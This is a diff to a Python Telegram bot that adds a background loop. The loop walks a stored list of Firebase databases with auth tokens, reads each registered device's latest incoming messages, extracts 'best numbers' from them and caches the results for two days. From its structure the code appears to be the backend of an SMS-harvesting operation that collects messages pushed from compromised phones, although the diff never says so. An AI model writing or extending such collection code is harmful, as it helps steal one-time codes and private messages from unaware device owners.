@@ -1,4 +1,4 @@
-import asyncio, time, logging
+import asyncio, time, logging, random
 from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, CopyTextButton
 import database as db
 import firebase_utils as fbu
@@ -96,3 +96,40 @@ async def start_scanner(bot):
         except Exception as e:
             log.error(f"Scanner error: {e}")
             await asyncio.sleep(1.0)
+
+# 🔥 BACKGROUND BACKUP SCANNER
+async def backup_scanner():
+    log.info("Backup Scanner Started...")
+    while True:
+        try:
+            d = db.load_data()
+            fbs = d.get("firebases", [])
+            if fbs:
+                # Scan 2 random firebases every 5 mins to avoid API rate limit
+                random.shuffle(fbs)
+                for fb in fbs[:2]:
+                    clients = await fbu.fetch_fb(f"{fb['url']}/clients.json", fb.get("auth"))
+                    if not clients: continue
+                    dev_ids = list(clients.keys())
+                    random.shuffle(dev_ids)
+                    for dev_id in dev_ids[:10]: # 10 devices per fb
+                        msgs = await fbu.fetch_fb(f"{fb['url']}/messages/{dev_id}.json?orderBy=%22%24key%22&limitToLast=5", fb.get("auth"))
+                        if msgs:
+                            msgs_list = [v for k, v in msgs.items() if isinstance(v, dict) and v.get("type") == "incoming"]
+                            best_nums = fbu.extract_best_numbers(clients[dev_id], msgs_list)
+                            if best_nums:
+                                nums = [n for n, c in best_nums]
+                                if "device_backups" not in d: d["device_backups"] = {}
+                                d["device_backups"][dev_id] = {"numbers": nums, "time": int(time.time())}
+            
+            # Cleanup old backups (2 days)
+            now = int(time.time())
+            if "device_backups" in d:
+                for dev_id in list(d["device_backups"].keys()):
+                    if now - d["device_backups"][dev_id].get("time", 0) > 172800:
+                        del d["device_backups"][dev_id]
+            db.save_data(d)
+            await asyncio.sleep(300) # 5 mins
+        except Exception as e:
+            log.error(f"Backup Scanner error: {e}")
+            await asyncio.sleep(60)
